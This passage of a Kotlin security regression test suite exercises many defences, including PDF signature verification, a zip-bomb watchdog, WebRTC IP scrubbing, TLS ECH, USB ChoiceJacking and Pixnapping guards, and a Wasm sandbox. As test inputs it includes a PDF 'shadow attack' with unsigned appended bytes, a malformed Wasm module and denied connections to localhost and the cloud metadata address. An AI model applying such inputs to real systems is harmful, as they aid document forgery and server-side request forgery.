        val tag10 = ZipAesExtraFieldCodec.computeHmacSha1Trunc80(keys.hmacKey, sampleCt)
        checkEq(10, tag10.size)
        checkTrue(ZipAesExtraFieldCodec.constantTimeVerify(tag10, tag10.copyOf()))
        val flippedTag = tag10.copyOf().also { it[4] = (it[4].toInt() xor 0x01).toByte() }
        checkTrue(!ZipAesExtraFieldCodec.constantTimeVerify(tag10, flippedTag))
        Files.write(artDir.resolve("r49-winzip-ae2.bin"), aeBytes + salt + keys.passwordVerifier2B + tag10)

        // FormatSandboxWatchdog: catches zip-bomb amplification (> 32x) & nesting bombs
        val wd = FormatSandboxWatchdog(maxAmplificationRatio = 20.0, maxNestingDepth = 4)
        val bombEx = checkThrows(FormatSandboxWatchdog.SandboxAbortException::class.java) {
            wd.recordEntry(compressedBytes = 2_048L, expandedBytes = 100_000L) // ~48.8x > 20x
        }
        checkEq(FormatSandboxWatchdog.ViolationKind.AMPLIFICATION_RATIO_EXCEEDED, bombEx.kind)

        // LokTileRenderCache + HeicIsomBoxInspector + AiPdfCompatibilityBridge
        val tileCache = LokTileRenderCache(tileSizePx = 256, maxCachedBytes = 1024L * 1024L)
        val tk = LokTileRenderCache.TileKey(0, 100, 0, 0)
        checkThrows(IllegalArgumentException::class.java) { tileCache.put(tk, ByteArray(4096)) }
        tileCache.put(tk, ByteArray(256 * 256 * 4) { 0x5A })
        checkEq(256 * 256 * 4, tileCache.get(tk)?.size)
        val evicted = tileCache.invalidateDirtyRect(0, LokTileRenderCache.TwipsRect(100, 100, 500, 500))
        checkEq(1, evicted)

        val heicBytes = buildMinimalHeicBytes(width = 4032, height = 3024, rotAngleCode = 1) // irot 90 deg
        Files.write(artDir.resolve("r49-sample.heic.bin"), heicBytes)
        val heicInfo = HeicIsomBoxInspector.inspect(heicBytes)
        checkEq("heic", heicInfo.majorBrand)
        checkEq(4032, heicInfo.widthPx)
        checkEq(3024, heicInfo.heightPx)
        checkEq(90, heicInfo.rotationDegrees)

        val aiPdf = "%PDF-1.7\n1 0 obj << /Type /Page /MediaBox [0 0 800 600] /PieceInfo << /Illustrator << >> >> >> endobj\n".toByteArray()
        val aiOk = AiPdfCompatibilityBridge.inspect(aiPdf)
        checkEq(AiPdfCompatibilityBridge.AiStreamKind.PDF_COMPATIBLE_ILLUSTRATOR, aiOk.kind)
        checkTrue(aiOk.canRouteToPdfPreview)
        val aiPs = "%!PS-Adobe-3.0\n%%Creator: Adobe Illustrator(TM) 8.0\n".toByteArray()
        val aiRefused = AiPdfCompatibilityBridge.inspect(aiPs)
        checkEq(AiPdfCompatibilityBridge.AiStreamKind.LEGACY_POSTSCRIPT_REFUSED, aiRefused.kind)
        checkTrue(!aiRefused.canRouteToPdfPreview)
    }

    private fun buildMinimalHeicBytes(width: Int, height: Int, rotAngleCode: Int): ByteArray {
        fun box(type: String, payload: ByteArray): ByteArray {
            val buf = ByteBuffer.allocate(8 + payload.size).order(ByteOrder.BIG_ENDIAN)
            buf.putInt(8 + payload.size)
            buf.put(type.toByteArray(StandardCharsets.US_ASCII))
            buf.put(payload)
            return buf.array()
        }
        val ftypPayload = ByteBuffer.allocate(16).order(ByteOrder.BIG_ENDIAN).apply {
            put("heic".toByteArray()); putInt(0); put("mif1".toByteArray()); put("heic".toByteArray())
        }.array()
        val ispePayload = ByteBuffer.allocate(12).order(ByteOrder.BIG_ENDIAN).apply {
            putInt(0); putInt(width); putInt(height)
        }.array()
        val irotPayload = byteArrayOf((rotAngleCode and 0x03).toByte())
        val ipco = box("ipco", box("ispe", ispePayload) + box("irot", irotPayload))
        val iprp = box("iprp", ipco)
        val metaPayload = ByteArray(4) + iprp // FullBox 4-byte version/flags + children
        return box("ftyp", ftypPayload) + box("meta", metaPayload)
    }

    // -----------------------------------------------------------------------------------------
    // 4. PDF AcroForm Inspector, Content-Stream Search Highlighter & Ed25519 Signed ByteRange
    // -----------------------------------------------------------------------------------------
    private fun checkPdfFormsSearchAndSignedEnvelope(artDir: Path) {
        val rawPdf = """
            %PDF-1.7
            1 0 obj << /Type /Catalog /AcroForm << /Fields [2 0 R 3 0 R] >> >> endobj
            2 0 obj << /FT /Tx /T (applicant_name) /V (Ada Lovelace) /Ff 2 /Rect [72 640 280 664] >> endobj
            3 0 obj << /FT /Btn /T (consent_ack) /V /Yes /Ff 0 /Rect [72 600 90 618] >> endobj
            %%EOF
        """.trimIndent().toByteArray(StandardCharsets.ISO_8859_1)
        val inspected = PdfFormAcroFieldInspector.inspectPdfBytes(rawPdf)
        checkEq(2, inspected.fields.size)
        checkTrue(!inspected.hasXfaDeprecatedWarning && !inspected.hasJavaScriptActionsQuarantined)
        val updates = PdfFormAcroFieldInspector.planFieldFill(inspected, mapOf("applicant_name" to "Grace Hopper"))
        checkTrue(updates[2]?.contains("(Grace Hopper)") == true)

        val stream = "BT /F1 12 Tf 72 700 Td (Confidential Security Audit 2026) Tj 0 -18 Td [(Tails ) -20 (ECH ) 10 (Verified)] TJ ET"
        val hits = PdfPageTextSearchHighlighter.searchHighlights(stream, "security audit")
        checkEq(1, hits.size)
        checkTrue(hits[0].x1Pt > hits[0].x0Pt)
        val tjHits = PdfPageTextSearchHighlighter.searchHighlights(stream, "tails ech")
        checkEq(1, tjHits.size)

        val kp = PdfPkcs7SignatureVerifier.generateEd25519KeyPair()
        val signedPdf = PdfPkcs7SignatureVerifier.signPdfEnvelopeEd25519(rawPdf, kp.private)
        Files.write(artDir.resolve("r49-signed-envelope.pdf"), signedPdf)
        val okReport = PdfPkcs7SignatureVerifier.verifyPdfSignature(signedPdf, kp.public)
        checkEq(PdfPkcs7SignatureVerifier.VerdictStatus.VALID_FULL_COVERAGE, okReport.status)
        checkTrue(okReport.isTrusted)

        // Negative-space: incremental unsigned bytes appended after EOF -> UNSIGNED_INCREMENTAL_BYTES_AFTER_SIGNATURE!
        val shadowAttack = signedPdf + "\n% Sneaky unsigned incremental shadow object\n".toByteArray(StandardCharsets.ISO_8859_1)
        val shadowVerdict = PdfPkcs7SignatureVerifier.verifyPdfSignature(shadowAttack, kp.public)
        checkEq(PdfPkcs7SignatureVerifier.VerdictStatus.UNSIGNED_INCREMENTAL_BYTES_AFTER_SIGNATURE, shadowVerdict.status)
    }

    // -----------------------------------------------------------------------------------------
    // 5. Browser (RFC 8828 WebRTC, Split Tabs, Perms, Find), RFC 9849 ECH & 9-Vector Shield
    // -----------------------------------------------------------------------------------------
    private fun checkBrowserPrivacyEchAndHardwareShield(artDir: Path) {
        val rawSdp = """
            v=0
            c=IN IP4 192.168.1.44
            a=candidate:1 1 udp 2122260223 192.168.1.44 54321 typ host
            a=candidate:2 1 udp 1686052607 203.0.113.77 54321 typ srflx raddr 192.168.1.44 rport 54321
            a=candidate:3 1 tcp 1518280447 198.51.100.9 443 typ relay raddr 203.0.113.77 rport 54321
        """.trimIndent()
        val mode4 = WebRtcIceCandidateScrubber.scrubSdp(rawSdp, WebRtcIceCandidateScrubber.IpHandlingMode.MODE_4_DISABLE_NON_PROXIED_UDP)
        checkEq(1, mode4.keptCandidates) // Only TCP relay survives Mode 4!
        checkEq(2, mode4.droppedCandidates)
        checkTrue(!mode4.scrubbedSdp.contains("192.168.1.44") && !mode4.scrubbedSdp.contains("203.0.113.77"))
        val mode2 = WebRtcIceCandidateScrubber.scrubSdp(rawSdp, WebRtcIceCandidateScrubber.IpHandlingMode.MODE_2_DEFAULT_ROUTE_AND_LOCAL)
        checkEq(1, mode2.mdnsMaskedCandidates)
        checkTrue(mode2.scrubbedSdp.contains(".local"))
        Files.writeString(artDir.resolve("r49-webrtc-mode4.sdp"), mode4.scrubbedSdp + "\n")

        // BrowserSplitTabWorkspace: vertical/horizontal splits, pinned immutability, sleep/wake & session restore
        val w1 = BrowserSplitTabWorkspace.BrowserWindowState(
            windowId = "winA",
            tabs = listOf(
                BrowserSplitTabWorkspace.BrowserTab("t1", "Docs", "https://docs.example", pinned = false, lastActiveEpochMs = 1_000L),
                BrowserSplitTabWorkspace.BrowserTab("t2", "Mail", "https://mail.example", pinned = true, lastActiveEpochMs = 1_000L),
                BrowserSplitTabWorkspace.BrowserTab("t3", "Spec", "https://rfc.example", pinned = false, groupId = "g1", lastActiveEpochMs = 1_000L),
            ),
            groups = mapOf("g1" to BrowserSplitTabWorkspace.TabGroup("g1", "Research", "#38BDF8")),
            primaryTabId = "t1",
        )
        checkEq("t2", w1.orderedTabs().first().tabId) // Pinned always first!
        val slept = BrowserSplitTabWorkspace.putIdleTabsToSleep(w1, nowEpochMs = 20 * 60_000L)
        checkTrue(!slept.tabs.first { it.tabId == "t2" }.sleeping) // Pinned never sleeps
        checkTrue(slept.tabs.first { it.tabId == "t3" }.sleeping) // Idle unpinned sleeps
        val split = BrowserSplitTabWorkspace.configureSplit(slept, BrowserSplitTabWorkspace.SplitOrientation.HORIZONTAL, "t1", "t3", 0.55)
        val afterClose = BrowserSplitTabWorkspace.batchCloseSelected(split, setOf("t2", "t3"), includePinned = false)
        checkTrue(afterClose.tabs.any { it.tabId == "t2" }) // Pinned protected from batch close!
        val sessionBlob = BrowserSplitTabWorkspace.serializeNamedSession("Morning Deep Work", listOf(split))
        val (restoredName, restoredWins) = BrowserSplitTabWorkspace.restoreNamedSession(sessionBlob)
        checkEq("Morning Deep Work", restoredName)
        checkEq(BrowserSplitTabWorkspace.SplitOrientation.HORIZONTAL, restoredWins[0].splitOrientation)

        // SitePermissionVault + FindInPageMatchEngine
        val vault = SitePermissionVault()
        vault.registerProfile(SitePermissionVault.BrowserProfile("work", "Work", "profile_work", ephemeralIncognito = false))
        vault.registerProfile(SitePermissionVault.BrowserProfile("incog", "Private", "profile_incog", ephemeralIncognito = true))
        // Negative-space: incognito profile downgrades ALLOW_PERSISTENT -> ALLOW_THIS_SESSION automatically!
        vault.setDecision("incog", "https://meet.example.com/room", SitePermissionVault.Capability.CAMERA, SitePermissionVault.Decision.ALLOW_PERSISTENT)
        checkEq(SitePermissionVault.Decision.ALLOW_THIS_SESSION, vault.effectiveDecision("incog", "https://meet.example.com", SitePermissionVault.Capability.CAMERA))
        checkEq(1, vault.clearSessionGrants("incog"))
        checkEq(SitePermissionVault.Decision.ASK, vault.effectiveDecision("incog", "https://meet.example.com", SitePermissionVault.Capability.CAMERA))

        val findSession = FindInPageMatchEngine.findAll(listOf("Café résumé naïve", "CAFE RESUME"), "cafe resume")
        checkEq(2, findSession.matches.size)
        checkEq(1, findSession.next().activeMatchIndex)
        checkEq(0, findSession.next().next().activeMatchIndex)
        checkEq(FindInPageMatchEngine.BrowserAction.FOCUS_OMNIBOX, FindInPageMatchEngine.resolveShortcut(true, false, false, "L"))

        // RFC 9849 TLS ECH binary codec + outer-ClientHello SNI leak audit
        val echCfg = TlsEchConfigCodec.EchConfig(
            configId = 42,
            kemId = TlsEchConfigCodec.KEM_DHKEM_X25519_HKDF_SHA256,
            hpkePublicKey = ByteArray(32) { (it * 5 + 9).toByte() },
            cipherSuites = listOf(
                TlsEchConfigCodec.HpkeSymmetricSuite(TlsEchConfigCodec.KDF_HKDF_SHA256, TlsEchConfigCodec.AEAD_AES_128_GCM),
                TlsEchConfigCodec.HpkeSymmetricSuite(TlsEchConfigCodec.KDF_HKDF_SHA256, TlsEchConfigCodec.AEAD_CHACHA20_POLY1305),
            ),
            maximumNameLength = 64,
            publicName = "cloudflare-ech.com",
        )
        val echListBytes = TlsEchConfigCodec.encodeConfigList(listOf(echCfg))
        Files.write(artDir.resolve("r49-rfc9849-echconfig.bin"), echListBytes)
        val decodedEch = TlsEchConfigCodec.decodeConfigList(echListBytes)
        checkEq(1, decodedEch.size)
        checkEq("cloudflare-ech.com", decodedEch[0].publicName)
        checkTrue(TlsEchConfigCodec.auditOuterClientHello(echCfg, " TorProject.org ".trim().lowercase(), "cloudflare-ech.com", true, false).compliant)
        // Negative-space: inner SNI leaked in cleartext outer ClientHello -> non-compliant!
        checkTrue(!TlsEchConfigCodec.auditOuterClientHello(echCfg, "secret.example.org", "secret.example.org", true, false).compliant)
        // RFC 9849 §5 outer ClientHelloEncryptedClientHello: 1B type + 4B suite + 1B id + 2B+32B enc + 2B+144B payload = 186B
        checkEq(186, TlsEchConfigCodec.generateGreaseOuterExtension(144).size)

        // ChoiceJackingUsbGuard (USENIX Security 2025)
        val aoapAttack = ChoiceJackingUsbGuard.evaluateAttach(
            ChoiceJackingUsbGuard.UsbAttachContext(
                vendorId = 0x18D1,
                productId = 0x2D01,
                interfaceClasses = listOf(0xFF, 0x03),
                screenLocked = false,
                activeVoiceOrVoipCall = false,
                msSinceVbusPowerAttach = 80L,
                msSinceLastExternalHidKeystroke = 10L,
            ),
        )
        checkEq(ChoiceJackingUsbGuard.UsbDataPolicy.QUARANTINE_CHOICEJACKING_ATTACK, aoapAttack.policy)
        checkTrue(aoapAttack.disableUsbDataSignaling && aoapAttack.blockExternalHidOnConsentDialog)
        checkTrue(!ChoiceJackingUsbGuard.shouldAcceptConsentInputEvent(isPhysicalInternalTouchscreen = false, inputFlagsObscured = false, keyCodeOrNull = 66))
        checkTrue(!ChoiceJackingUsbGuard.shouldAcceptConsentInputEvent(isPhysicalInternalTouchscreen = true, inputFlagsObscured = true, keyCodeOrNull = null))
        checkTrue(ChoiceJackingUsbGuard.shouldAcceptConsentInputEvent(isPhysicalInternalTouchscreen = true, inputFlagsObscured = false, keyCodeOrNull = null))

        // PixnappingSurfaceShield (CVE-2025-48561)
        val critSpec = PixnappingSurfaceShield.policyFor(PixnappingSurfaceShield.SurfaceSensitivity.CRITICAL_SECRET_2FA_OR_SEED)
        checkTrue(critSpec.flagSecure && critSpec.hideOverlayWindows && !critSpec.crossWindowBlurEnabled && critSpec.isolateFromExternalTaskStack)
        checkTrue(!PixnappingSurfaceShield.allowIncomingLaunchIntent(PixnappingSurfaceShield.SurfaceSensitivity.CRITICAL_SECRET_2FA_OR_SEED, callerUid = 10205, ownUid = 10100, launchedInForeignTask = false))
        val lumaTile = PixnappingSurfaceShield.generateAntiCompressionLumaTile(16, 16)
        checkEq(256, lumaTile.size)
        checkTrue(lumaTile.toSet().size >= 4, "anti-GPU.zip tile breaks zero-entropy planar compression")

        // TailsCaTrustPinBlocklist (Tails 7.15.1 2026-10-23 CVE-2026-113470 + Tails 7.7 June-2026 UEFI cert expiry)
        val emudhraChain = listOf(
            TailsCaTrustPinBlocklist.CertChainNode("login.example", "eMudhra Technologies Limited", "a".repeat(64), "2027-05-01"),
        )
        val caRes = TailsCaTrustPinBlocklist.evaluateTlsChain(emudhraChain, LocalDate.of(2026, 10, 27))
        checkEq(TailsCaTrustPinBlocklist.ChainDecision.BLOCKED_EMERGENCY_CA_DISTRUST, caRes.decision)
        val bootAudit = TailsCaTrustPinBlocklist.auditBootCertificates(
            listOf("Microsoft Corporation UEFI CA 2011" to "2026-06-27", "Windows UEFI CA 2023" to "2038-10-19"),
            today = LocalDate.of(2026, 10, 27),
        )
        checkTrue(bootAudit[0].expired && bootAudit[0].requiresRolloverUpdate)
        checkTrue(!bootAudit[1].expired)

        // VpnAppFirewallPolicy + PowerDvfsTimingMitigator + ModuleAppLockGate + UsbDataSignalingController + TinkAeadKeysetEnvelope
        val fw = VpnAppFirewallPolicy.CompiledFirewall(
            strictAnonymityMode = true,
            defaultRule = VpnAppFirewallPolicy.AppRule.TUNNEL_ONLY,
            uidRules = mapOf(10050 to VpnAppFirewallPolicy.AppRule.BLOCK_ALL),
        )
        checkEq(
            VpnAppFirewallPolicy.Verdict.DROP_DNS_LEAK,
            fw.inspectPacket(VpnAppFirewallPolicy.PacketMeta(10080, VpnAppFirewallPolicy.TransportProto.UDP, "8.8.8.8", 53, false, true)),
        )
        checkEq(
            VpnAppFirewallPolicy.Verdict.DROP_UNTUNNELED_EGRESS,
            fw.inspectPacket(VpnAppFirewallPolicy.PacketMeta(10080, VpnAppFirewallPolicy.TransportProto.TCP, "93.184.216.34", 443, false, false)),
        )

        val dvfs = PowerDvfsTimingMitigator(epochMs = 25L)
        val sched = dvfs.scheduleKeystrokeRelease(windowStartMs = 1_000L, rawArrivalMs = 1_011L)
        checkEq(1_025L, sched.scheduledReleaseMs)
        checkEq(32, dvfs.runIsochronousWorkTick(1L, true).size)
        checkTrue(dvfs.isSuspiciousTelemetryPolling(sampleIntervalMs = 2L, sensitiveInputFocused = true))

        val lockGate = ModuleAppLockGate(idleTimeoutMs = 60_000L)
        lockGate.attemptUnlock("vault", credentialValid = true, nowMs = 1_000L)
        checkTrue(lockGate.isUnlocked("vault", nowMs = 30_000L))
        checkTrue(!lockGate.isUnlocked("vault", nowMs = 75_000L))
        lockGate.attemptUnlock("vault", credentialValid = true, nowMs = 80_000L)
        lockGate.lockAllImmediate(81_000L, "screen_off")
        checkTrue(!lockGate.isUnlocked("vault", 81_001L))

        val usbCtrl = UsbDataSignalingController(UsbDataSignalingController.PortPolicyMode.DISABLE_WHILE_LOCKED)
        checkEq(
            UsbDataSignalingController.PortSignalState.EMERGENCY_PANIC_LOCK_TRIGGERED,
            usbCtrl.evaluatePortTransition(deviceLocked = true, wasConnectedBeforeLock = true, cableUnpluggedWhileLocked = true, deviceFingerprintSha256 = null, amnesicWatchdogArmed = true),
        )

        val rng = SecureRandom()
        val k1 = ByteArray(32).also { rng.nextBytes(it) }
        val ks1 = TinkAeadKeysetEnvelope.Keyset(101, listOf(TinkAeadKeysetEnvelope.KeyEntry(101, TinkAeadKeysetEnvelope.KeyStatus.ENABLED, k1)))
        val ksRotated = ks1.rotateWithNewPrimary(202, rng)
        val secretPayload = ByteArray(10_000) { (it * 13 + 7).toByte() }
        val aad = "vault-container-v1".toByteArray()
        val ctOld = TinkAeadKeysetEnvelope.encryptStream(ks1, secretPayload, aad, chunkSize = 2_048)
        // Rotated keyset still decrypts container encrypted under older key 101!
        checkTrue(TinkAeadKeysetEnvelope.decryptStream(ksRotated, ctOld, aad).contentEquals(secretPayload))
        val ctNew = TinkAeadKeysetEnvelope.encryptStream(ksRotated, secretPayload, aad, chunkSize = 2_048)
        Files.write(artDir.resolve("r49-tink-stream.bin"), ctNew)
        val tamperedCt = ctNew.copyOf().also { it[ctNew.size - 5] = (it[ctNew.size - 5].toInt() xor 0x40).toByte() }
        checkThrows(Exception::class.java) { TinkAeadKeysetEnvelope.decryptStream(ksRotated, tamperedCt, aad) }
    }

    // -----------------------------------------------------------------------------------------
    // 6. Wasm 2.0 Sandbox: Table, Global, Element, Passive Data (memory.init/data.drop), f32
    // -----------------------------------------------------------------------------------------
    private fun checkWasm2TableGlobalDataAndFloat32(artDir: Path) {
        val wasmBytes = buildR49Wasm2Module()
        Files.write(artDir.resolve("r49-wasm2-showcase.wasm"), wasmBytes)
        val mod = WasmSandbox.decode(wasmBytes)
        val inst = mod.instantiate(maxMemoryPages = 2)

        // Func 2 (`dispatch_op(opIdx, x)`): table[0]=add10(x), table[1]=mul3(x), also increments mutable global[0]
        checkEq(listOf(52), inst.invoke("dispatch_op", listOf(0, 42)).returnValues)
        checkEq(listOf(39), inst.invoke("dispatch_op", listOf(1, 13)).returnValues)
        checkEq(102, inst.readGlobalBits("calls_counter")) // init=100 + 2 calls!

        // Negative-space: out-of-bounds table index -> UNDEFINED_ELEMENT trap
        val oobTrap = checkThrows(WasmSandbox.WasmTrapException::class.java) {
            inst.invoke("dispatch_op", listOf(99, 1))
        }
        checkEq(WasmSandbox.TrapKind.UNDEFINED_ELEMENT, oobTrap.kind)

        // Negative-space: call_indirect slot 2 holds signature (f32,f32)->f32 != expected (i32)->i32 -> INDIRECT_CALL_TYPE_MISMATCH!
        val mismatchTrap = checkThrows(WasmSandbox.WasmTrapException::class.java) {
            inst.invoke("dispatch_op", listOf(2, 1))
        }
        checkEq(WasmSandbox.TrapKind.INDIRECT_CALL_TYPE_MISMATCH, mismatchTrap.kind)

        // Func 3 (`hypot_f32(a, b)`): sqrt(a*a + b*b) + f32.const containing raw 0x0B byte inside structured if!
        val hyp = inst.invokeF32("hypot_f32", listOf(3.0f, 4.0f))
        checkNear(5.0, hyp.toDouble(), 1e-5)

        // Func 4 (`load_passive_banner(dst)`): 0xFC 0x08 memory.init + 0xFC 0x09 data.drop!
        inst.invoke("init_and_drop_passive", listOf(64))
        checkEq("FUSION49", String(inst.readMemory(64, 8), StandardCharsets.US_ASCII))
        // After data.drop, a second memory.init with len>0 MUST trap OUT_OF_BOUNDS_MEMORY!
        val droppedTrap = checkThrows(WasmSandbox.WasmTrapException::class.java) {
            inst.invoke("init_only_passive", listOf(128))
        }
        checkEq(WasmSandbox.TrapKind.OUT_OF_BOUNDS_MEMORY, droppedTrap.kind)

        // Section I Zero-Trust Adversarial Regression: DataCount(12) placed AFTER Code(10) MUST be rejected!
        val badOrderWasm = byteArrayOf(
            0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
            1, 4, 1, 0x60, 0, 0,       // Type(1): ()->()
            3, 2, 1, 0,                 // Function(3)
            10, 4, 1, 2, 0, 0x0B,       // Code(10) BEFORE DataCount(12) -> illegal per Wasm 2.0 §5.5.2!
            12, 1, 0,                   // DataCount(12) out of order!
        )
        checkThrows(IllegalArgumentException::class.java) { WasmSandbox.decode(badOrderWasm) }

        // WasiSocketCapabilityGate + AppFunctionsSchemaRegistry
        val sockGate = WasiSocketCapabilityGate(allowedEndpoints = setOf("api.github.com" to 443), maxEgressBytes = 1024L)
        checkTrue(sockGate.checkConnect("api.github.com", 443).permitted)
        checkEq(WasiSocketCapabilityGate.ERRNO_NOTCAPABLE, sockGate.checkConnect("127.0.0.1", 8080).wasiErrno)
        checkEq(WasiSocketCapabilityGate.ERRNO_NOTCAPABLE, sockGate.checkConnect("169.254.169.254", 80).wasiErrno)
        checkTrue(sockGate.recordSend(600).permitted)
        checkEq(WasiSocketCapabilityGate.ERRNO_FBIG, sockGate.recordSend(600).wasiErrno)

        val okFn = AppFunctionsSchemaRegistry.validateCall("dev.fusion.calc.evaluate", mapOf("expression" to "6*7"), callerHasUserConsentToken = false)
        checkTrue(okFn.accepted)
        val mutNoConsent = AppFunctionsSchemaRegistry.validateCall("dev.fusion.notes.createDraft", mapOf("title" to "T", "markdown" to "Body"), callerHasUserConsentToken = false)
        checkTrue(!mutNoConsent.accepted, "mutating AppFunction without user consent token refused")
    }

    private fun buildR49Wasm2Module(): ByteArray {
        fun uleb(v0: Int): ByteArray {
            var v = v0
            val out = ByteArrayOutputStream()
            do {
                var b = v and 0x7F
                v = v ushr 7
                if (v != 0) b = b or 0x80
                out.write(b)
            } while (v != 0)
            return out.toByteArray()
        }
        fun sec(id: Int, body: ByteArray): ByteArray = byteArrayOf(id.toByte()) + uleb(body.size) + body
        fun f32Bytes(f: Float): ByteArray {
            val bits = f.toRawBits()
            return byteArrayOf((bits and 0xFF).toByte(), ((bits ushr 8) and 0xFF).toByte(), ((bits ushr 16) and 0xFF).toByte(), ((bits ushr 24) and 0xFF).toByte())
        }
        // Types: 0: (i32)->i32, 1: (i32,i32)->i32, 2: (f32,f32)->f32, 3: (i32)->void
        val typeSec = sec(1, byteArrayOf(
            4,
            0x60, 1, 0x7F, 1, 0x7F,
            0x60, 2, 0x7F, 0x7F, 1, 0x7F,
            0x60, 2, 0x7D, 0x7D, 1, 0x7D,
            0x60, 1, 0x7F, 0,
        ))
        // Funcs: 0=add10(t0), 1=mul3(t0), 2=dispatch_op(t1), 3=hypot_f32(t2), 4=init_and_drop(t3), 5=init_only(t3)
        val funcSec = sec(3, byteArrayOf(6, 0, 0, 1, 2, 3, 3))
        // Table 0: funcref (0x70), min=4
        val tableSec = sec(4, byteArrayOf(1, 0x70, 0x00, 4))
        // Memory 0: min=1, max=2
        val memSec = sec(5, byteArrayOf(1, 0x01, 1, 2))
        // Global 0: mutable i32 = 100 (`0x41 0xE4 0x00 0x0B`)
        val globSec = sec(6, byteArrayOf(1, 0x7F, 0x01, 0x41, 0xE4.toByte(), 0x00, 0x0B))
        // Exports
        fun expEntry(name: String, kind: Int, idx: Int): ByteArray {
            val nb = name.toByteArray(StandardCharsets.UTF_8)
            return uleb(nb.size) + nb + byteArrayOf(kind.toByte(), idx.toByte())
        }
        val expBody = byteArrayOf(5) +
            expEntry("dispatch_op", 0, 2) +
            expEntry("hypot_f32", 0, 3) +
            expEntry("init_and_drop_passive", 0, 4) +
            expEntry("init_only_passive", 0, 5) +
            expEntry("calls_counter", 3, 0)
        val expSec = sec(7, expBody)
        // Element: active table 0 at offset 0 -> [func 0, func 1, func 3] (note slot 2 has type 2!)
        val elemSec = sec(9, byteArrayOf(1, 0, 0x41, 0, 0x0B, 3, 0, 1, 3))
        // DataCount section (id=12): 1 segment
        val dataCntSec = sec(12, byteArrayOf(1))

        fun fnBody(code: ByteArray): ByteArray {
            val full = byteArrayOf(0) + code + byteArrayOf(0x0B)
            return uleb(full.size) + full
        }
        val b0 = fnBody(byteArrayOf(0x20, 0, 0x41, 10, 0x6A)) // local.get 0; i32.const 10; i32.add
        val b1 = fnBody(byteArrayOf(0x20, 0, 0x41, 3, 0x6C))  // local.get 0; i32.const 3; i32.mul
        // dispatch_op(idx, x): global[0] += 1; push x; push idx; call_indirect(type=0, table=0)
        val b2 = fnBody(byteArrayOf(
            0x23, 0, 0x41, 1, 0x6A, 0x24, 0,
            0x20, 1, 0x20, 0, 0x11, 0, 0,
        ))
        // hypot_f32(a, b): includes structured `if (result f32)` containing an f32.const with 0x0B in its IEEE-754 mantissa!
        val trickyZero = Float.fromBits(0x00000000)
        val trickyConstWith0B = Float.fromBits(0x3F800B0B) // contains TWO 0x0B bytes that MUST NOT confuse block scanner!
        val b3 = fnBody(
            byteArrayOf(0x41, 1, 0x04, 0x7D) + // i32.const 1; if (result f32)
                byteArrayOf(0x20, 0, 0x20, 0, 0x94.toByte(), 0x20, 1, 0x20, 1, 0x94.toByte(), 0x92.toByte(), 0x91.toByte()) + // sqrt(a*a+b*b)
                byteArrayOf(0x05, 0x43) + f32Bytes(trickyConstWith0B) + // else f32.const 0x3F800B0B
                byteArrayOf(0x0B, 0x43) + f32Bytes(trickyZero) + byteArrayOf(0x92.toByte()), // end; + 0.0f
        )
        // init_and_drop_passive(dst): dst, src=0, len=8, memory.init(data=0, mem=0), data.drop(data=0)
        val b4 = fnBody(byteArrayOf(
            0x20, 0, 0x41, 0, 0x41, 8, 0xFC.toByte(), 8, 0, 0,
            0xFC.toByte(), 9, 0,
        ))
        // init_only_passive(dst): dst, src=0, len=8, memory.init(data=0, mem=0)
        val b5 = fnBody(byteArrayOf(0x20, 0, 0x41, 0, 0x41, 8, 0xFC.toByte(), 8, 0, 0))
        val codeSec = sec(10, byteArrayOf(6) + b0 + b1 + b2 + b3 + b4 + b5)
        // Data section (id=11): 1 passive segment (mode=1) "FUSION49"
        val banner = "FUSION49".toByteArray(StandardCharsets.US_ASCII)
        val dataSec = sec(11, byteArrayOf(1, 1, banner.size.toByte()) + banner)

        val header = byteArrayOf(0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00)
        return header + typeSec + funcSec + tableSec + memSec + globSec + expSec + elemSec + dataCntSec + codeSec + dataSec
    }

    // -----------------------------------------------------------------------------------------
    // 7. Shell, Windowing, Files, Billing, Commands, Settings, Perf, Index, Storage, Design, UI
    // -----------------------------------------------------------------------------------------
    private fun checkShellWindowingFilesBillingAndCore(artDir: Path) {
        val extSpec = BlackTopSessionCoordinator.ExternalDisplaySpec(2, 2560, 1440, 120)
        val bt = BlackTopSessionCoordinator.evaluateSession(extSpec, preferTrackpadOnPhone = true, elapsedMinutes = 15)
        checkTrue(bt.active && bt.foregroundKeepAliveRequired)
        checkEq(BlackTopSessionCoordinator.PhoneSurfaceMode.VIRTUAL_TOUCHPAD_AND_KEYBOARD, bt.phoneSurfaceMode)
        val moved = BlackTopSessionCoordinator.mapTrackpadDeltaToExternalCursor(100.0, 50.0, 2500.0, 1400.0, extSpec)
        checkTrue(moved.first <= 2559.0 && moved.second <= 1439.0)
        checkTrue(BlackTopSessionCoordinator.diagnoseOemThrottling("Samsung", 33, false).phantomProcessRisk)

        val dPhone = MultiDisplayWindowBroker.DisplayBounds(0, 412, 915)
        val dExt = MultiDisplayWindowBroker.DisplayBounds(2, 1920, 1080)
        val rules = mapOf("calc" to MultiDisplayWindowBroker.WindowGeometryRule("calc", 2, 360, 420, alwaysOnTopMini = true))
        val spawned = MultiDisplayWindowBroker.spawnWithRememberedRule("w1", "calc", 0, mapOf(0 to dPhone, 2 to dExt), rules)
        checkEq(2, spawned.displayId)
        checkEq(MultiDisplayWindowBroker.ZLayer.ALWAYS_ON_TOP_MINI, spawned.zLayer)
        val evacuated = MultiDisplayWindowBroker.handleDisplayDisconnect(listOf(spawned), 2, dPhone)
        checkEq(0, evacuated[0].displayId)
        checkEq(1919 to 0, MultiDisplayWindowBroker.confineCursorToDisplay(2500, -40, 1920, 1080, true))

        // JournaledFileOpsPlanner + ArchiveDocumentsProviderTree
        val bytesA = "Important financial ledger".toByteArray()
        val shaA = DuplicateFileClusterer.sha256Hex(bytesA)
        val batch = JournaledFileOpsPlanner.planBatch(
            listOf(Triple(JournaledFileOpsPlanner.OpKind.MOVE, "inbox/report.xlsx", "archive/report.xlsx")),
            mapOf("inbox/report.xlsx" to shaA),
            setOf("archive/report.xlsx"),
            JournaledFileOpsPlanner.ConflictPolicy.KEEP_BOTH_SUFFIX,
        )
        checkEq("archive/report (1).xlsx", batch[0].resolvedTargetPath)
        val committed = JournaledFileOpsPlanner.verifyDestinationAndCommit(batch[0], bytesA)
        checkEq(JournaledFileOpsPlanner.EntryState.VERIFIED_COMMITTED, committed.state)
        val rolledBack = JournaledFileOpsPlanner.verifyDestinationAndCommit(batch[0], "corrupted".toByteArray())
        checkEq(JournaledFileOpsPlanner.EntryState.ROLLED_BACK, rolledBack.state)
